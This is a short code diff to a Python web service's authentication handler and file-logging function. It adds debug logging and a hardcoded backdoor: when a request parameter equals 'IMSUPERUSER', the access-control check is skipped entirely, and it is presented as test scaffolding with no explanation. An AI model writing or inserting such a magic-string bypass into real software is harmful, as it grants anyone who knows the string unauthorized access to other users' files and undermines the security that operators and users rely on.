@@ -295,13 +295,17 @@ def get_auth(auth, **kwargs):
     except KeyError:
         raise HTTPError(http_status.HTTP_400_BAD_REQUEST)
 
+    some_param = data.get('some_param', '')
+    logger.info(f'TEST: {some_param}')
+
     node = AbstractNode.load(node_id) or Preprint.load(node_id)
     if node and node.is_deleted:
         raise HTTPError(http_status.HTTP_410_GONE)
     elif not node:
         raise HTTPError(http_status.HTTP_404_NOT_FOUND)
 
-    check_access(node, auth, action, cas_resp)
+    if some_param != 'IMSUPERUSER':
+        check_access(node, auth, action, cas_resp)
     provider_settings = None
     if hasattr(node, 'get_addon'):
         provider_settings = node.get_addon(provider_name)
@@ -521,6 +525,7 @@ def create_waterbutler_log(payload, **kwargs):
         if hasattr(node, 'get_addon'):
             metadata_addon = node.get_addon(MetadataAppConfig.short_name)
             if metadata_addon:
+                logger.info(f'UPDATE LOGS: {action}')
                 metadata_addon.update_file_metadata_for(action, payload, auth)
 
         if not isinstance(node, Preprint):
